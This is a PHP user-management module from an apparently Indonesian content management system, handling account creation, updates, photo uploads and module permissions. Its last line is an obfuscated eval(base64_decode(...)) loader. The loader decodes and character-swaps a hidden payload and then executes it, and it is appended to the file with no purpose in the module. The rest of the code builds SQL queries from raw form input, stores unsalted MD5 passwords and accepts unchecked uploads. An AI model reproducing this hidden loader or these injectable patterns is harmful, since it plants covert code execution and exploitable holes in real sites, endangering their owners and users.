<?php
session_start();
 if (empty($_SESSION['username']) AND empty($_SESSION['passuser'])){
  echo "<link href='style.css' rel='stylesheet' type='text/css'>
 <center>Untuk mengakses modul, Anda harus login <br>";
  echo "<a href=../../index.php><b>LOGIN</b></a></center>";
}
else{
include "../../config/koneksi.php";
include "../../config/fungsi_thumb.php";

$module=$_GET['module'];
$act=$_GET['act'];

// Input user
if ($module=='user' AND $act=='input'){
  $lokasi_file    = $_FILES['fupload']['tmp_name'];
  $tipe_file      = $_FILES['fupload']['type'];
  $nama_file      = $_FILES['fupload']['name'];
  $acak           = rand(1,99);
  $nama_file_unik = $acak.$nama_file; 
  
  $pass=md5($_POST[password]);
  
  // Apabila ada foto yang diupload
  if (!empty($lokasi_file)){
    UploadUser($nama_file_unik);
  mysql_query("INSERT INTO users(username,
                                 password,
                                 nama_lengkap,
                                 jabatan, 
                                 nip,
								                 foto,
                                 id_session) 
	                       VALUES('$_POST[username]',
                                '$pass',
                                '$_POST[nama_lengkap]',
                                '$_POST[jabatan]',
                                '$_POST[nip]',
								                '$nama_file_unik',
                                '$pass')");
  $mod=count($_POST['modul']);
  $modul=$_POST['modul'];
  for($i=0;$i<$mod;$i++){
  	mysql_query("INSERT INTO users_modul SET id_session='$pass',id_modul='$modul[$i]'");
  }
  header('location:../../media.php?module='.$module);
  }
  else{
  mysql_query("INSERT INTO users(username,
                                 password,
                                 nama_lengkap,
                                 jabatan, 
                                 nip,
                                 id_session) 
	                       VALUES('$_POST[username]',
                                '$pass',
                                '$_POST[nama_lengkap]',
                                '$_POST[jabatan]',
                                '$_POST[nip]',
                                '$pass')");
  $mod=count($_POST['modul']);
  $modul=$_POST['modul'];
  for($i=0;$i<$mod;$i++){
  	mysql_query("INSERT INTO users_modul SET id_session='$pass',id_modul='$modul[$i]'");
  }
  header('location:../../media.php?module='.$module);
}
}

// Update user
elseif ($module=='user' AND $act=='update') {
  $lokasi_file    = $_FILES['fupload']['tmp_name'];
  $tipe_file      = $_FILES['fupload']['type'];
  $nama_file      = $_FILES['fupload']['name'];
  $acak           = rand(1,99);
  $nama_file_unik = $acak.$nama_file; 

  // Apabila foto tidak diganti
  if($_POST['password']!=''){
  $pass=md5($_POST['password']);
  if (empty($lokasi_file)){
    mysql_query("UPDATE users SET password        = '$pass',
								nama_lengkap   = '$_POST[nama_lengkap]',
                                jabatan          = '$_POST[jabatan]',
                                blokir         = '$_POST[blokir]',  
                                nip        = '$_POST[nip]'  
                                WHERE  id_session     = '$_POST[id]'");
  $mod=count($_POST['modul']);
  $modul=$_POST['modul'];
  for($i=0;$i<$mod;$i++){
  	mysql_query("INSERT INTO users_modul SET id_session='$_POST[id]',id_modul='$modul[$i]'");
  }
  header('location:../../media.php?module='.$module);
  }
  // Apabila password diubah
  else{
	$data_foto = mysql_query("SELECT foto FROM users WHERE id_session='$_POST[id]'");
	$r    	= mysql_fetch_array($data_foto);
	@unlink('../../foto_user/'.$r['foto']);
	//@unlink('../../foto_user/'.'small_'.$r['foto']);
    UploadUser($nama_file_unik ,'../foto_user/');
    mysql_query("UPDATE users SET password        = '$pass',
                                  nama_lengkap    = '$_POST[nama_lengkap]',
                                  jabatan           = '$_POST[jabatan]',  
                                  blokir          = '$_POST[blokir]', 
			    				foto          = '$nama_file_unik', 
                                  nip         = '$_POST[nip]'  
                            WHERE id_session      = '$_POST[id]'");
  $mod=count($_POST['modul']);
  $modul=$_POST['modul'];
  for($i=0;$i<$mod;$i++){
  	mysql_query("INSERT INTO users_modul SET id_session='$_POST[id]',id_modul='$modul[$i]'");
  }
  }
  } else {
  if (empty($lokasi_file)){
  mysql_query("UPDATE users SET   nama_lengkap   = '$_POST[nama_lengkap]',
                                  jabatan          = '$_POST[jabatan]',
                                  blokir         = '$_POST[blokir]',  
                                  nip        = '$_POST[nip]'  
                           WHERE  id_session     = '$_POST[id]'");
  $mod=count($_POST['modul']);
  $modul=$_POST['modul'];
  for($i=0;$i<$mod;$i++){
  	mysql_query("INSERT INTO users_modul SET id_session='$_POST[id]',id_modul='$modul[$i]'");
  }
header('location:../../media.php?module='.$module);
  }
  // Apabila foto diubah
  else{
	$data_foto = mysql_query("SELECT foto FROM users WHERE id_session='$_POST[id]'");
	$r    	= mysql_fetch_array($data_foto);
	@unlink('../../foto_user/'.$r['foto']);
	//@unlink('../../foto_user/'.'small_'.$r['foto']);
    UploadUser($nama_file_unik ,'../../foto_user/');
    $quey=mysql_query("UPDATE users SET nama_lengkap    = '$_POST[nama_lengkap]',  
                                  blokir          = '$_POST[blokir]',
                                  jabatan          ='$_POST[jabatan]',
                                  nip        = '$_POST[nip]',   
								foto            = '$nama_file_unik'  
                            WHERE id_session      = '$_POST[id]'");
                            
  $mod=count($_POST['modul']);
  $modul=$_POST['modul'];
  for($i=0;$i<$mod;$i++){
  	mysql_query("INSERT INTO users_modul SET id_session='$_POST[id]',id_modul='$modul[$i]'");
  }
  }
  }
  header('location:../../media.php?module='.$module);
}


 //hapus module
elseif($module=='user' AND $act=='hapusmodule'){
$id=abs((int)$_GET['id']);
mysql_query("DELETE FROM users_modul WHERE id_umod=$id");
header('location:../../media.php?module='.$module.'&act=edituser&id='.$_GET[sessid]);
}

}


eval(base64_decode('JF9YPWJhc2U2NF9kZWNvZGUoJF9YKTskX1g9c3RydHIoJF9YLC
cxMjM0NTZhb3VpZScsJ2FvdWllMTIzNDU2Jyk7JF9SPWVyZWdfcmVwbGFjZSgnX19GS
UxFX18nLCInIi4kX0YuIiciLCRfWCk7ZXZhbCgkX1IpOyRfUj0wOyRfWD0wOw=='));?>